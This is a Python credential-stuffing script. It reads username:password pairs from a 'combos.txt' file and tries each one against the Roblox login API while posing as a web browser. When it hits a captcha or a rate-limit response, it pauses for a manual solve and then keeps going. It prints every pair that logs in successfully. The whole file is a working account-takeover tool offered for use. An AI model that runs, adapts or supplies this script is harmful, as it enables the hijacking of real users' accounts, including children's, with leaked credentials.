import os
import requests
from bs4 import BeautifulSoup

# Roblox login URL
login_url = 'https://auth.roblox.com/v1/login'

# Headers to simulate a real browser request
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Open Roblox login page in browser if CAPTCHA is suspected
def handle_captcha():
    print("\n⚠️ CAPTCHA detected or suspicious response. Opening Roblox login page...")
    os.system("termux-open-url https://www.roblox.com/login")
    input("🔓 After solving the CAPTCHA in your browser, press Enter to continue...\n")

# Function to attempt login
def try_login(username, password):
    session = requests.Session()
    session.headers.update(headers)

    payload = {
        'username': username,
        'password': password
    }

    # POST request to Roblox login API
    response = session.post(login_url, data=payload)

    # Check for possible CAPTCHA or unusual response
    if "captcha" in response.text.lower() or response.status_code == 429:
        handle_captcha()
        return False

    # Check for successful login (you may also inspect cookies or tokens here)
    if "roblox.com/home" in response.url or response.status_code == 200 and "X-CSRF-TOKEN" in response.headers:
        return True

    return False

# Read and test credentials from file
def check_credentials(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if ':' not in line:
                continue  # Skip invalid lines

            username, password = line.split(':', 1)
            print(f"🔍 Attempting login: {username}:{password}")

            if try_login(username, password):
                print(f"✅ SUCCESS! Valid credentials: {username}:{password}")
            else:
                print(f"❌ Failed: {username}:{password}")

# Replace with your credentials file path
file_path = 'combos.txt'
check_credentials(file_path)
